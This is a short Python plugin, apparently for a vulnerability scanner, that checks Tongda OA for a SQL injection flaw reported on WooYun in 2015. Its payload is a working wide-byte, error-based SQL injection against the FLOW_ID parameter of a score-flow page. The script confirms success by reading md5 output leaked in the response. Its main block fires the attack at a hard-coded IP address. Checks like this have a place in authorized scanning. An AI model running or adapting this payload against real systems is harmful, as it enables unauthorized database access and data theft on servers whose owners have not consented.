#!/usr/bin/python
#-*- coding: utf-8 -*-
#Refer http://www.wooyun.org/bugs/wooyun-2015-0116359
#__Author__ = 来電顯示
import re

def assign(service, arg):
    if service == "tongdaoa":
        return True, arg

def audit(arg):
    payload = 'general/score/flow/scoredate/result.php?FLOW_ID=11%bf%27%20and%20(SELECT%201%20from%20(select%20count(*),concat(floor(rand(0)*2),(substring((select%20md5(1)),1,62)))a%20from%20information_schema.tables%20group%20by%20a)b)%23'
    url = arg + payload
    code, head,res, errcode, _url = curl.curl2(url)
    if code == 200 and 'c4ca4238a0b923820dcc509a6f75849b' in res: 
        r = re.search('MySQL result resource in <b>([^<]+)</b>',res)
        if r:
            security_info(r.group(1))
        security_hole(url)
                        
if __name__ == '__main__':
    from dummy import *
    audit(assign('tongdaoa', 'http://122.144.134.79/')[1])